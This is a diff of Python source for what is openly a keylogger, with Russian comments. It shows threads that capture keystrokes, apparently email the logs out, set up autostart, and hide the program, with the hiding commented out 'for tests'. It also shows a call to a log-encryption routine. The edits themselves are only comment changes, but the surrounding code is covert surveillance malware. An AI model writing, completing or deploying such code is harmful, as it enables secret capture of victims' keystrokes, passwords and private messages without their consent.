@@ -76,7 +76,8 @@ class AddTextFile:
             log_keys.clear()
             log_keys_sys.clear()
 
-            main_ecrp()
+            main_ecrp() # запуск скрипта ширфовки
+
 
 class LanguageQual(AddTextFile):
     """КЛАСС ПОЛУЧЕНИЯ ЯЗЫКА РАССКЛАДКИ"""
@@ -176,19 +177,19 @@ if __name__ == '__main__':
     # потоки
     keylogger_thread = threading.Thread(target=start_keylogger)
     main_email_thread = threading.Thread(target=main)
-    #hide_prog_thread = threading.Thread(target=hide_prog)  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
+    # hide_prog_thread = threading.Thread(target=hide_prog)  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
 
     main_startup()
 
     # старт потоков
     keylogger_thread.start()
     main_email_thread.start()
-    #hide_prog_thread.start()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
+    # hide_prog_thread.start()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
 
     # ожидание завершение др потока
     keylogger_thread.join()
     main_email_thread.join()
-    #hide_prog_thread.join()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
+    # hide_prog_thread.join()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
 
 
 
